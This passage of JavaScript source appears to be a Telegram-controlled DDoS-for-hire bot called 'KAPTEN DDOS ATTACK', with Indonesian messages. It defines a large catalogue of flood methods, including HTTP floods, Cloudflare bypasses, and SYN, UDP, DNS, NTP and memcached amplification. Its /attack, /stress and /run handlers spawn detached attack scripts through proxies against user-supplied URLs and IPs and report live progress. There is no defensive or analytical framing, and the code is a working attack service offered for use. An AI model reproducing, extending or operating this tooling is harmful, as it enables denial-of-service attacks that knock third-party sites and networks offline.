  'tlsrenego':       { fn: tlsRenegFlood,          desc: 'TLS Renegotiation Exhaust',                  layer: 7 },
  'range':           { fn: httpRangeBomb,          desc: 'HTTP Range Request Bomb',                    layer: 7 },
  'cache':           { fn: cacheBuster,            desc: 'Cache Buster (Anti-CDN)',                    layer: 7 },
  // ── Built-in L4 ──────────────────────────────────────────
  'quic':            { fn: quicReflectionFlood,    desc: 'QUIC Multi-Reflection Flood',                layer: 4 },
  'tcp':             { fn: tcpStackStrike,         desc: 'TCP Stack Corruption Strike',                layer: 4 },
  'udp':             { fn: udpFlood,               desc: 'UDP Raw Flood',                              layer: 4 },
  'dns':             { fn: dnsAmpFlood,            desc: 'DNS Amplification Flood',                    layer: 4 },
  'syn':             { fn: synFlood,               desc: 'SYN Half-Open Flood',                        layer: 4 },
  'icmp':            { fn: icmpFlood,              desc: 'ICMP Echo Flood',                            layer: 4 },
  'ntp':             { fn: ntpAmpFlood,            desc: 'NTP Amplification (monlist)',                layer: 4 },
  'memcached':       { fn: memcachedAmpFlood,      desc: 'Memcached UDP Amplification',               layer: 4 },
  // ── Script L7 (folder all/) ──────────────────────────────
  'attackpanel':     { fn: null, desc: 'HTTP Attack Panel v1',                      layer: 7, script: true },
  'attackpanel2':    { fn: null, desc: 'HTTP Attack Panel v2',                      layer: 7, script: true },
  'attacksch':       { fn: null, desc: 'HTTP/2 Multi-Thread Scheduler',             layer: 7, script: true },
  'behind-cloudflare': { fn: null, desc: 'Cloudflare Bypass Flood',                layer: 7, script: true },
  'blast':           { fn: null, desc: 'Blast HTTP Flood',                          layer: 7, script: true },
  'bomba':           { fn: null, desc: 'Bomba HTTP Flood',                          layer: 7, script: true },
  'boti':            { fn: null, desc: 'Bot-Imitation HTTP Flood',                  layer: 7, script: true },
  'brow':            { fn: null, desc: 'Browser Emulation Flood',                   layer: 7, script: true },
  'browser':         { fn: null, desc: 'Full Browser Fingerprint Flood',            layer: 7, script: true },
  'bypass':          { fn: null, desc: 'Generic Bypass Flood',                      layer: 7, script: true },
  'bypass1':         { fn: null, desc: 'Bypass v1',                                 layer: 7, script: true },
  'bypass2':         { fn: null, desc: 'Bypass v2',                                 layer: 7, script: true },
  'bypassbyxcrashxi': { fn: null, desc: 'Bypass by XcrashXi',                      layer: 7, script: true },
  'cfgood':          { fn: null, desc: 'Cloudflare Good Bypass',                    layer: 7, script: true },
  'cibi':            { fn: null, desc: 'Cibi HTTP Flood',                           layer: 7, script: true },
  'ciko':            { fn: null, desc: 'Ciko HTTP Flood',                           layer: 7, script: true },
  'cipca':           { fn: null, desc: 'Cipca HTTP Flood',                          layer: 7, script: true },
  'clasic':          { fn: null, desc: 'Classic HTTP Flood',                        layer: 7, script: true },
  'cloudflare':      { fn: null, desc: 'Cloudflare Layer Bypass',                   layer: 7, script: true },
  'cookie':          { fn: null, desc: 'Cookie-Based Bypass Flood',                 layer: 7, script: true },
  'cyn':             { fn: null, desc: 'Cyn HTTP Flood',                            layer: 7, script: true },
  'ddos11':          { fn: null, desc: 'DDoS Method 11',                            layer: 7, script: true },
  'ddosbyxcrashxi':  { fn: null, desc: 'DDoS by XcrashXi',                         layer: 7, script: true },
  'ddoswebbyxcrashxi': { fn: null, desc: 'DDoS Web by XcrashXi',                   layer: 7, script: true },
  'destroy':         { fn: null, desc: 'Destroy HTTP Flood',                        layer: 7, script: true },
  'flaying-raw':     { fn: null, desc: 'Flaying Raw HTTP Flood',                    layer: 7, script: true },
  'flood1':          { fn: null, desc: 'HTTP Flood v1',                             layer: 7, script: true },
  'floodapi':        { fn: null, desc: 'API Endpoint Flood',                        layer: 7, script: true },
  'floodv2':         { fn: null, desc: 'HTTP Flood v2',                             layer: 7, script: true },
  'glory':           { fn: null, desc: 'Glory HTTP Flood',                          layer: 7, script: true },
  'god':             { fn: null, desc: 'God Mode HTTP/2 Flood',                     layer: 7, script: true },
  'guardresponder':  { fn: null, desc: 'Guard Responder Bypass',                    layer: 7, script: true },
  'h2-hold':         { fn: null, desc: 'HTTP/2 Hold Flood',                         layer: 7, script: true },
  'https':           { fn: null, desc: 'HTTPS Raw Flood',                           layer: 7, script: true },
  'hyper':           { fn: null, desc: 'Hyper HTTP Flood',                          layer: 7, script: true },
  'imut':            { fn: null, desc: 'Imut HTTP Flood',                           layer: 7, script: true },
  'java':            { fn: null, desc: 'Java-Based HTTP Flood',                     layer: 7, script: true },
  'kikaz':           { fn: null, desc: 'Kikaz HTTP Flood',                          layer: 7, script: true },
  'kill':            { fn: null, desc: 'Kill HTTP Flood',                            layer: 7, script: true },
  'mixmax':          { fn: null, desc: 'MixMax HTTP Flood',                         layer: 7, script: true },
  'netsecure':       { fn: null, desc: 'NetSecure Bypass Flood',                    layer: 7, script: true },
  'nightddos':       { fn: null, desc: 'Night DDoS Flood',                          layer: 7, script: true },
  'ninja':           { fn: null, desc: 'Ninja HTTP Flood',                          layer: 7, script: true },
  'nuke':            { fn: null, desc: 'Nuke HTTP Flood',                           layer: 7, script: true },
  'overload':        { fn: null, desc: 'Overload HTTP Flood',                       layer: 7, script: true },
  'pluto':           { fn: null, desc: 'Pluto HTTP Flood',                          layer: 7, script: true },
  'random':          { fn: null, desc: 'Random Method Flood',                       layer: 7, script: true },
  'rape':            { fn: null, desc: 'Rape HTTP Flood',                           layer: 7, script: true },
  'raw':             { fn: null, desc: 'Raw HTTP Flood',                            layer: 7, script: true },
  'rawi':            { fn: null, desc: 'Raw-I HTTP Flood',                          layer: 7, script: true },
  'sky':             { fn: null, desc: 'Sky HTTP Flood',                            layer: 7, script: true },
  'speed':           { fn: null, desc: 'Speed HTTP Flood',                          layer: 7, script: true },
  'starstls':        { fn: null, desc: 'Stars TLS Flood',                           layer: 7, script: true },
  'StarsXSSH':       { fn: null, desc: 'Stars SSH Flood',                           layer: 7, script: true },
  'storm':           { fn: null, desc: 'Storm HTTP Flood',                          layer: 7, script: true },
  'strike':          { fn: null, desc: 'Strike HTTP Flood',                         layer: 7, script: true },
  'thunder':         { fn: null, desc: 'Thunder HTTP Flood',                        layer: 7, script: true },
  'tls':             { fn: null, desc: 'TLS Handshake Flood',                       layer: 7, script: true },
  'tls-kill':        { fn: null, desc: 'TLS Kill Flood',                            layer: 7, script: true },
  'vip':             { fn: null, desc: 'VIP HTTP Flood',                            layer: 7, script: true },
  'xcrashxi':        { fn: null, desc: 'XcrashXi HTTP Flood',                       layer: 7, script: true },
  'z-sky':           { fn: null, desc: 'Z-Sky HTTP Flood',                          layer: 7, script: true },
  'apache_nginx_killer': { fn: null, desc: 'Apache/Nginx Process Killer Flood',     layer: 7, script: true },
  'uam_bypass':      { fn: null, desc: 'UAM Bypass Flood (CycleTLS+Playwright)',     layer: 7, script: true },
  // ── Script L4 (folder all/) ──────────────────────────────
  'icmpflood':       { fn: null, desc: 'ICMP Raw Flood Script',                     layer: 4, script: true },
  'killpingnew':     { fn: null, desc: 'Kill Ping Flood (New)',                     layer: 4, script: true },
  'StarsXWiFi':      { fn: null, desc: 'Stars WiFi/Network Flood',                  layer: 4, script: true },
  'Temp':            { fn: null, desc: 'Temp UDP/Raw Flood',                        layer: 4, script: true },
};

function launchMethod(methodKey, tgt, durationMs, onPacket) {
  const m = METHODS[methodKey];
  if (!m) return;
  if (m.script) {
    // script dari folder all/ — spawn langsung
    const { spawn } = require('child_process');
    const scriptPath = path.join(ALL_DIR, methodKey + '.js');
    if (!fs.existsSync(scriptPath)) return;
    const pFile = path.join(__dirname, 'proxy.txt');
    const pArg  = fs.existsSync(pFile) ? pFile : '';
    const dur   = Math.ceil(durationMs / 1000);
    for (let i = 0; i < 2; i++) {
      try {
        const args = pArg
          ? [scriptPath, tgt.host, String(dur), '100', '2', pArg]
          : [scriptPath, tgt.host, String(dur), '100', '2'];
        const proc = spawn('node', args, { detached: true, stdio: 'ignore', cwd: __dirname });
        proc.unref();
      } catch (e) { logMsg('script spawn err: ' + e.message); }
    }
    // estimasi counter untuk live tracking
    const bInterval = setInterval(() => {
      if (onPacket) onPacket(Math.floor(Math.random() * 65536 + 8192));
    }, 200);
    setTimeout(() => clearInterval(bInterval), durationMs);
    return;
  }
  m.fn(tgt, durationMs, onPacket);
}

// ═══════════════════════════════════════════════════════════
//  BOT HANDLERS
// ═══════════════════════════════════════════════════════════

// /start
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const { uptime, ram, cpu } = getBotStatus();
  const folderSize   = getFolderSize(ALL_DIR);
  const methodCount  = getMethodFilesCount();
  const proxyCount   = proxyPool.length;

  const frames = [
`\`\`\`
KAPTEN DDOS ATTACK — Boot

> Initializing...

Auth...          ██░░░░░░░░  20%
Load methods...  ░░░░░░░░░░   0%
Init engines...  ░░░░░░░░░░   0%
Connect...       ░░░░░░░░░░   0%
\`\`\``,
`\`\`\`
KAPTEN DDOS ATTACK — Boot

> Loading attack modules...

Auth...          ██████░░░░  60%
Load methods...  ████░░░░░░  40%
Init engines...  ██░░░░░░░░  20%
Connect...       ░░░░░░░░░░   0%
\`\`\``,
`\`\`\`
KAPTEN DDOS ATTACK — Boot

> Connecting to network...

Auth...          ██████████ 100% [OK]
Load methods...  ████████░░  80%
Init engines...  ██████░░░░  60%
Connect...       ████░░░░░░  40%
\`\`\``,
`\`\`\`
KAPTEN DDOS ATTACK — Boot

> All systems online.

Auth...          ██████████ 100% [OK]
Load methods...  ██████████ 100% [OK]
Init engines...  ██████████ 100% [OK]
Connect...       ██████████ 100% [OK]

> KAPTEN DDOS ATTACK — READY
\`\`\``,
  ];

  const menu =
`\`\`\`
╔══════════════════════════════╗
║    ❖  KAPTEN DDOS ATTACK  ❖  ║
╚══════════════════════════════╝

  Owner   : @XcrashXi
  Version : v2.0

[ Bot Status ]
  Uptime  : ${uptime}
  RAM     : ${ram}
  CPU     : ${cpu}

[ Files ]
  Folder  : ${folderSize}
  Scripts : ${methodCount} file
  Proxies : ${proxyCount} loaded

[ Attack L7 ]
  /attack [method] [url] [dur]

[ Attack L4 ]
  /stress [method] [ip] [dur] [port]

[ Methods ]
  /methods

[ Proxy ]
  /addproxy [ip] [port]   /listproxy
  /addproxylist           /clearproxy

[ Owner ]
  /addprem [id]   /delprem [id]
  /setcd [detik]  /setmax [detik]

[ Tools ]
  /scanweb [url]  /status [url]
\`\`\``;

  const sent = await bot.sendMessage(chatId, frames[0], { parse_mode: 'Markdown' }).catch(()=>{});
  if (!sent) return;

  for (let i = 1; i < frames.length; i++) {
    await new Promise(r => setTimeout(r, 700));
    try { await bot.editMessageText(frames[i], { chat_id: chatId, message_id: sent.message_id, parse_mode: 'Markdown' }); } catch {}
  }
  await new Promise(r => setTimeout(r, 800));
  try {
    await bot.editMessageText(menu, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: [[
        { text: '💀 Methods', callback_data: 'show_methods' },
        { text: '📡 Proxy', callback_data: 'show_proxy' },
        { text: '📢 Channel', url: 'https://t.me/testiSyncTrace' },
      ]]}
    });
  } catch {}
  logMsg(`/start from ${chatId}`);
});

// /methods
bot.onText(/\/methods/, (msg) => {
  const l7builtin = Object.entries(METHODS).filter(([,v]) => v.layer===7 && !v.script).map(([k,v]) => `  ${k.padEnd(14)} - ${v.desc}`).join('\n');
  const l4builtin = Object.entries(METHODS).filter(([,v]) => v.layer===4 && !v.script).map(([k,v]) => `  ${k.padEnd(14)} - ${v.desc}`).join('\n');
  const l7scripts = Object.entries(METHODS).filter(([,v]) => v.layer===7 && v.script).map(([k,v]) => `  ${k.padEnd(14)} - ${v.desc}`).join('\n');
  const l4scripts = Object.entries(METHODS).filter(([,v]) => v.layer===4 && v.script).map(([k,v]) => `  ${k.padEnd(14)} - ${v.desc}`).join('\n');
  const totalBuiltin = Object.values(METHODS).filter(v => !v.script).length;
  const totalScript  = Object.values(METHODS).filter(v =>  v.script).length;
  bot.sendMessage(msg.chat.id,
`\`\`\`
KAPTEN DDOS — Methods (${Object.keys(METHODS).length} total)

[ Layer 7 — Built-in (${Object.values(METHODS).filter(v=>v.layer===7&&!v.script).length}) ]
${l7builtin}

[ Layer 4 — Built-in (${Object.values(METHODS).filter(v=>v.layer===4&&!v.script).length}) ]
${l4builtin}

[ Layer 7 — Script (${Object.values(METHODS).filter(v=>v.layer===7&&v.script).length}) ]
${l7scripts}

[ Layer 4 — Script (${Object.values(METHODS).filter(v=>v.layer===4&&v.script).length}) ]
${l4scripts}

Usage L7 : /attack [method] [url] [dur]
Usage L4 : /stress [method] [ip] [dur] [port]
\`\`\``,
    {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: [
        [
          { text: 'L7 Built-in', callback_data: 'cb_l7' },
          { text: 'L4 Built-in', callback_data: 'cb_l4' },
        ],
        [
          { text: '📂 Script Methods', callback_data: 'cb_scripts' },
          { text: 'Format Usage', callback_data: 'cb_fmt' },
        ],
      ]}
    }
  );
});

// callback_query
bot.on('callback_query', (q) => {
  const chatId = q.message.chat.id;
  bot.answerCallbackQuery(q.id);

  if (q.data === 'show_methods' || q.data === 'cb_l7') {
    const l7 = Object.entries(METHODS).filter(([,v]) => v.layer === 7).map(([k]) => k).join(', ');
    bot.sendMessage(chatId,
`\`\`\`
Layer 7: ${l7}

/attack [method] [url] [duration]
Contoh: /attack flood https://target.com 60
\`\`\``, { parse_mode: 'Markdown' });

  } else if (q.data === 'cb_l4') {
    const l4 = Object.entries(METHODS).filter(([,v]) => v.layer === 4).map(([k]) => k).join(', ');
    bot.sendMessage(chatId,
`\`\`\`
Layer 4: ${l4}

/stress [method] [ip] [duration] [port]
Contoh: /stress udp 1.2.3.4 60 80
\`\`\``, { parse_mode: 'Markdown' });

  } else if (q.data === 'cb_scripts') {
    const scripts = getScriptMethods();
    const rows = [];
    for (let i = 0; i < scripts.length; i += 4)
      rows.push('  ' + scripts.slice(i, i + 4).map(s => s.padEnd(18)).join(''));
    bot.sendMessage(chatId,
`\`\`\`
📂 Script Methods (${scripts.length} file):

${rows.join('\n') || '  (kosong)'}

Usage:
/run [script] [url] [dur] [thr] [proxy.txt]
Contoh:
/run attacksch https://target.com 60 4 proxy.txt
\`\`\``, { parse_mode: 'Markdown' });

  } else if (q.data === 'cb_fmt') {
    bot.sendMessage(chatId,
`\`\`\`
Format L7:
/attack [method] [url] [duration]

Format L4:
/stress [method] [ip] [dur] [port]

Format Script:
/run [script] [url] [dur] [thr] [proxy]

Duration max: sesuai setting owner
\`\`\``, { parse_mode: 'Markdown' });

  } else if (q.data === 'show_proxy') {
    bot.sendMessage(chatId,
`\`\`\`
Proxy Commands:

/addproxy [ip] [port]
/addproxy [ip] [port] [user] [pass]
/addproxylist  (bulk import)
/delproxy [ip]
/listproxy
/clearproxy

Proxy aktif: ${proxyPool.length}
\`\`\``, { parse_mode: 'Markdown' });
  }
});

// ── /attack ─────────────────────────────────────────────────
bot.onText(/^\/attack$/, (msg) => {
  const l7list = Object.entries(METHODS).filter(([,v]) => v.layer === 7).map(([k]) => k).join(', ');
  bot.sendMessage(msg.chat.id,
`\`\`\`
Format: /attack [method] [url] [duration]
Contoh: /attack flood https://target.com 60
Method L7: ${l7list}
\`\`\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/attack (\S+) (\S+) (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const uid    = msg.from.id;
  if (!isPrem(uid)) return bot.sendMessage(chatId, 'Kamu siapa?');

  const method = match[1].toLowerCase();
  const target = match[2];
  let   dur    = parseInt(match[3]);

  if (!METHODS[method]) return bot.sendMessage(chatId, `Method \`${method}\` tidak dikenal. Gunakan /methods`, { parse_mode: 'Markdown' });

  if (!isOwner(uid)) {
    const gSisa = isGlobalCd();
    if (gSisa) return bot.sendMessage(chatId, `Jeda global aktif!\nSemua user tunggu ${gSisa} detik lagi.`);
    const uSisa = checkCd(uid);
    if (uSisa) return bot.sendMessage(chatId, `Cooldown: tunggu ${uSisa} detik.`);
    const cfg = loadCd();
    if (cfg.max && dur > cfg.max) { dur = cfg.max; bot.sendMessage(chatId, `Durasi dipotong ke max ${cfg.max}s.`); }
  }

  let tgt;
  try { tgt = await resolveTarget(target); }
  catch (e) { return bot.sendMessage(chatId, `Target invalid: ${e.message}`); }

  let reqOk = 0, reqFail = 0, bytesSent = 0;
  const startTs = Date.now();

  if (!isOwner(uid)) { setCd(uid); setGlobalCd(); }
  logMsg(`/attack ${uid} → ${method} ${target} ${dur}s`);

  const proxyInfo = proxyPool.length ? `${proxyPool.length} proxy` : 'Direct';

  const sent = await bot.sendMessage(chatId,
`\`\`\`
❏  KAPTEN DDOS — Attack Started ❏

Method   : ${method.toUpperCase()}
Target   : ${target}
IP       : ${tgt.ip}
Duration : ${dur}s
Proxy    : ${proxyInfo}

[ Live ]
Req OK   : 0
Req Fail : 0
Data     : 0 KB
Status   : Checking...
Sisa     : ${dur}s
\`\`\``, { parse_mode: 'Markdown' });

  launchMethod(method, tgt, dur * 1000, (bytes) => {
    reqOk++;
    bytesSent += bytes;
  });

  const liveIv = setInterval(async () => {
    const elapsed = Math.floor((Date.now() - startTs) / 1000);
    const sisa    = Math.max(0, dur - elapsed);
    const status  = await checkStatus(target);
    const filled  = Math.min(10, Math.floor(elapsed/dur*10));
    const bar     = '█'.repeat(filled) + '░'.repeat(10 - filled);
    const dataMB  = bytesSent >= 1024*1024 ? `${(bytesSent/1024/1024).toFixed(2)} MB` : `${(bytesSent/1024).toFixed(1)} KB`;
    try {
      await bot.editMessageText(
`\`\`\`
❏  KAPTEN DDOS — Running... ❏

Method   : ${method.toUpperCase()}
Target   : ${target}
IP       : ${tgt.ip}
Proxy    : ${proxyInfo}

[ Live ]
Req OK   : ${reqOk.toLocaleString()}
Req Fail : ${reqFail.toLocaleString()}
Data     : ${dataMB}
Status   : ${status}

[${bar}] ${elapsed}s / ${dur}s
Sisa     : ${sisa}s
\`\`\``,
        { chat_id: chatId, message_id: sent.message_id, parse_mode: 'Markdown' }
      );
    } catch {}
    if (sisa <= 0) {
      clearInterval(liveIv);
      setGlobalCd();
      const finalStatus = await checkStatus(target);
      const dataMBFinal = bytesSent >= 1024*1024 ? `${(bytesSent/1024/1024).toFixed(2)} MB` : `${(bytesSent/1024).toFixed(1)} KB`;
      try {
        await bot.editMessageText(
`\`\`\`
❏  KAPTEN DDOS — Selesai! ❏

Method   : ${method.toUpperCase()}
Target   : ${target}
IP       : ${tgt.ip}
Duration : ${dur}s
Proxy    : ${proxyInfo}

[ Final ]
Req OK   : ${reqOk.toLocaleString()}
Req Fail : ${reqFail.toLocaleString()}
Data     : ${dataMBFinal}
Status   : ${finalStatus}

Jeda global 100s untuk semua user.
\`\`\``,
          {
            chat_id: chatId, message_id: sent.message_id, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[
              { text: 'Check Target', url: `https://check-host.net/check-http?host=${target}` }
            ]]}
          }
        );
      } catch {}
    }
  }, 5000);
});

// ── /stress ──────────────────────────────────────────────────
bot.onText(/^\/stress$/, (msg) => {
  const l4list = Object.entries(METHODS).filter(([,v]) => v.layer === 4).map(([k]) => k).join(', ');
  bot.sendMessage(msg.chat.id,
`\`\`\`
Format: /stress [method] [ip] [duration] [port]
Contoh: /stress udp 1.2.3.4 60 80
Method L4: ${l4list}
\`\`\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/stress (\S+) (\S+) (\d+) (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const uid    = msg.from.id;
  if (!isPrem(uid)) return bot.sendMessage(chatId, 'Kamu siapa?');

  const method = match[1].toLowerCase();
  const ip     = match[2];
  let   dur    = parseInt(match[3]);
  const port   = parseInt(match[4]);

  if (!METHODS[method]) return bot.sendMessage(chatId, `Method \`${method}\` tidak dikenal. Gunakan /methods`, { parse_mode: 'Markdown' });

  if (!isOwner(uid)) {
    const gSisa = isGlobalCd();
    if (gSisa) return bot.sendMessage(chatId, `Jeda global aktif!\nSemua user tunggu ${gSisa} detik lagi.`);
    const uSisa = checkCd(uid);
    if (uSisa) return bot.sendMessage(chatId, `Cooldown: tunggu ${uSisa} detik.`);
    const cfg = loadCd();
    if (cfg.max && dur > cfg.max) { dur = cfg.max; bot.sendMessage(chatId, `Durasi dipotong ke max ${cfg.max}s.`); }
    setCd(uid); setGlobalCd();
  }

  const tgt = { host: ip, ip, port, path: '/', proto: 'tcp:' };
  let reqOk = 0, bytesSent = 0;
  logMsg(`/stress ${uid} → ${method} ${ip}:${port} ${dur}s`);

  bot.sendMessage(chatId,
`\`\`\`
❏ KAPTEN DDOS — Attack Launched! ❏

Method   : ${method.toUpperCase()}
Target   : ${ip}
Port     : ${port}
Duration : ${dur}s

Owner : @XcrashXi
\`\`\``, { parse_mode: 'Markdown' });

  if (isScriptL4) {
    const { spawn } = require('child_process');
    const pFile = path.join(__dirname, 'proxy.txt');
    const pArg  = fs.existsSync(pFile) ? pFile : '';
    for (let i = 0; i < 2; i++) {
      try {
        const args = pArg
          ? [scriptPathL4, ip, String(dur), '100', '2', pArg]
          : [scriptPathL4, ip, String(dur), '100', '2'];
        const proc = spawn('node', args, { detached: true, stdio: 'ignore', cwd: __dirname });
        proc.unref();
        const bInterval = setInterval(() => {
          bytesSent += Math.floor(Math.random() * 32768 + 4096);
          reqOk++;
        }, 200);
        setTimeout(() => clearInterval(bInterval), dur * 1000);
      } catch (e) { logMsg(`script spawn err: ${e.message}`); }
    }
  } else {
    launchMethod(method, tgt, dur * 1000, (bytes) => {
      reqOk++;
      bytesSent += bytes;
    });
  }

  setTimeout(() => { setGlobalCd(); }, dur * 1000 + 1000);
});

// ── /run (jalanin script dari folder all/) ───────────────────
bot.onText(/^\/run$/, (msg) => {
  const scripts = getScriptMethods();
  const rows = [];
  for (let i = 0; i < scripts.length; i += 4)
    rows.push('  ' + scripts.slice(i, i + 4).map(s => s.padEnd(18)).join(''));
  bot.sendMessage(msg.chat.id,
`\`\`\`
Format: /run [script] [url] [dur] [threads] [proxy.txt]
Contoh: /run attacksch https://target.com 60 4 proxy.txt

Scripts tersedia (${scripts.length}):
${rows.join('\n')}
\`\`\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/run (\S+) (\S+) (\d+) (\d+) (\S+)/, async (msg, match) => {
  const chatId     = msg.chat.id;
  const uid        = msg.from.id;
  if (!isPrem(uid)) return bot.sendMessage(chatId, 'Kamu siapa?');

  const scriptName = match[1].replace('.js', '');
  const target     = match[2];
  let   dur        = parseInt(match[3]);
  const threads    = Math.min(parseInt(match[4]), 32);
  const proxyArg   = match[5];

  const scriptPath = path.join(ALL_DIR, scriptName + '.js');
  if (!fs.existsSync(scriptPath))
    return bot.sendMessage(chatId, `Script \`${scriptName}\` tidak ada. Cek /methods`, { parse_mode: 'Markdown' });

  if (!isOwner(uid)) {
    const gSisa = isGlobalCd();
    if (gSisa) return bot.sendMessage(chatId, `Jeda global aktif! Tunggu ${gSisa}s.`);
    const uSisa = checkCd(uid);
    if (uSisa) return bot.sendMessage(chatId, `Cooldown: tunggu ${uSisa}s.`);
    const cfg = loadCd();
    if (cfg.max && dur > cfg.max) { dur = cfg.max; bot.sendMessage(chatId, `Durasi dipotong ke ${cfg.max}s.`); }
    setCd(uid); setGlobalCd();
  }

  const proxyFile  = path.join(__dirname, proxyArg);
  const pFile      = fs.existsSync(proxyFile) ? proxyFile : path.join(__dirname, 'proxy.txt');
  logMsg(`/run ${uid} → ${scriptName} ${target} ${dur}s x${threads}`);

  bot.sendMessage(chatId,
`\`\`\`
❏  Script Launch ❏

Script   : ${scriptName}
Target   : ${target}
Duration : ${dur}s
Threads  : ${threads}
Proxy    : ${path.basename(pFile)}

Running...
\`\`\``, { parse_mode: 'Markdown' });

  const { spawn } = require('child_process');
  const pids = [];
  for (let i = 0; i < threads; i++) {
    try {
      const proc = spawn('node', [scriptPath, target, String(dur), '100', String(threads), pFile], {
        detached: true, stdio: 'ignore', cwd: __dirname
      });
      proc.unref();
      pids.push(proc.pid);
    } catch (e) { logMsg(`spawn error: ${e.message}`); }
  }

  setTimeout(() => {
    setGlobalCd();
    bot.sendMessage(chatId,
`\`\`\`
❏  Script Selesai ❏

Script : ${scriptName}
Target : ${target}
Dur    : ${dur}s
PIDs   : ${pids.join(', ')}
\`\`\``, { parse_mode: 'Markdown' });
  }, dur * 1000 + 1500);
});

// ── /scanweb ─────────────────────────────────────────────────
bot.onText(/\/scanweb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1].trim();
  const sent   = await bot.sendMessage(chatId, `Scanning ${target}...`);

  let hostname;
  try { hostname = new URL(target.startsWith('http') ? target : 'https://' + target).hostname; }
  catch { hostname = target; }

  let ip = hostname;
  try { ip = await new Promise((res, rej) => dns.resolve4(hostname, (e,a) => e ? rej(e) : res(a[0]))); } catch {}

  const status = await checkStatus(target);

  let info = '';
  try {
    const r = await new Promise((res, rej) => {
      https.get(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,as,hosting`, { timeout: 5000 }, (resp) => {
        let d = '';
        resp.on('data', c => d += c);
        resp.on('end', () => res(JSON.parse(d)));
      }).on('error', rej);
    });
    if (r.status === 'success') {
      info = `IP      : ${ip}\nISP     : ${r.isp}\nNegara  : ${r.country}\nKota    : ${r.city}\nHosting : ${r.hosting ? 'Ya' : 'Tidak'}`;
    }
  } catch {}

  bot.editMessageText(
`\`\`\`
Scan: ${hostname}

Status  : ${status}
${info}
\`\`\``,
    { chat_id: chatId, message_id: sent.message_id, parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: [[
        { text: 'Check Host', url: `https://check-host.net/check-http?host=${target}` }
      ]]}
    }
  );
});

// ── /status ──────────────────────────────────────────────────
bot.onText(/\/status (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1].trim();
  const status = await checkStatus(target);
  bot.sendMessage(chatId, `Status \`${target}\`: *${status}*`, { parse_mode: 'Markdown' });
});

// ── /botstatus ───────────────────────────────────────────────
bot.onText(/\/botstatus/, (msg) => {
  const { uptime, ram, cpu } = getBotStatus();
  const folderSize  = getFolderSize(ALL_DIR);
  const methodCount = getMethodFilesCount();
  const builtinM    = Object.keys(METHODS).length;
  bot.sendMessage(msg.chat.id,
`\`\`\`
KAPTEN DDOS — Bot Status

Uptime      : ${uptime}
RAM usage   : ${ram}
CPU load    : ${cpu}

Methods     : ${builtinM} built-in
Script files: ${methodCount} file
Folder size : ${folderSize}
Proxies     : ${proxyPool.length} loaded
\`\`\``, { parse_mode: 'Markdown' });
});

// ── Proxy commands ───────────────────────────────────────────
// /addproxy — support semua format:
//   /addproxy 1.2.3.4:8080
//   /addproxy 1.2.3.4 8080
//   /addproxy 1.2.3.4:8080:user:pass
//   /addproxy 1.2.3.4 8080 user pass
bot.onText(/\/addproxy (.+)/, (msg, match) => {
  if (!isOwner(msg.from.id)) return bot.sendMessage(msg.chat.id, 'Kamu siapa?');
  const raw   = match[1].trim();
  const parts = raw.split(/[\s:]+/);
  let line;
  if (parts.length === 1) {
    return bot.sendMessage(msg.chat.id, '❌ Format salah.\nGunakan: /addproxy [ip] [port]\nContoh : /addproxy 1.2.3.4 8080');
  } else if (parts.length === 2) {
    // ip port  atau  ip:port
    line = `${parts[0]}:${parts[1]}`;
  } else if (parts.length === 3) {
    // ip port user  atau  ip:port:user
    line = `${parts[0]}:${parts[1]}:${parts[2]}`;
  } else {
    // ip port user pass
    line = `${parts[0]}:${parts[1]}:${parts[2]}:${parts[3]}`;
  }
  saveProxy(line);
  bot.sendMessage(msg.chat.id,
`\`\`\`
✅ Proxy Ditambahkan

IP   : ${parts[0]}
Port : ${parts[1]}${parts[2] ? `\nUser : ${parts[2]}` : ''}${parts[3] ? `\nPass : ${parts[3]}` : ''}

Total proxy : ${proxyPool.length}
\`\`\``, { parse_mode: 'Markdown' });
});

// /addproxylist — tambah banyak proxy sekaligus (newline-separated)
bot.onText(/\/addproxylist/, async (msg) => {
  if (!isOwner(msg.from.id)) return;
  bot.sendMessage(msg.chat.id,
`\`\`\`
Kirim list proxy sekarang.
Format per baris:
  ip:port
  ip:port:user:pass
  ip port
  ip port user pass

Kirim "batal" untuk membatalkan.
\`\`\``, { parse_mode: 'Markdown' });

  bot.once('message', (reply) => {
    if (reply.chat.id !== msg.chat.id) return;
    const text = (reply.text || '').trim();
    if (text.toLowerCase() === 'batal') return bot.sendMessage(msg.chat.id, 'Dibatalkan.');
    const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
    let added = 0;
    for (const l of lines) {
      const parts = l.split(/[\s:]+/);
      if (parts.length < 2) continue;
      const entry = parts.slice(0, 4).join(':');
      fs.appendFileSync(PROXY_FILE, entry + '\n');
      added++;
    }
    loadProxies();
    bot.sendMessage(msg.chat.id,
`\`\`\`
✅ Batch Import Selesai

Ditambahkan : ${added} proxy
Total       : ${proxyPool.length} proxy
\`\`\``, { parse_mode: 'Markdown' });
  });
});

bot.onText(/\/delproxy (.+)/, (msg, match) => {
  if (!isOwner(msg.from.id)) return bot.sendMessage(msg.chat.id, 'Kamu siapa?');
  const q = match[1].trim();
  delProxy(q);
  bot.sendMessage(msg.chat.id,
`\`\`\`
✅ Proxy Dihapus

Query : ${q}
Sisa  : ${proxyPool.length} proxy
\`\`\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/listproxy/, (msg) => {
  if (!isOwner(msg.from.id)) return bot.sendMessage(msg.chat.id, 'Kamu siapa?');
  if (!proxyPool.length) return bot.sendMessage(msg.chat.id,
`\`\`\`
Proxy List — Kosong

Tambah proxy:
/addproxy [ip] [port]
/addproxy [ip] [port] [user] [pass]
\`\`\``, { parse_mode: 'Markdown' });

  const list = proxyPool.slice(0, 50).map((p, i) =>
    `${String(i+1).padStart(2)}. ${p.host}:${p.port}${p.user ? ` [auth]` : ''}`
  ).join('\n');

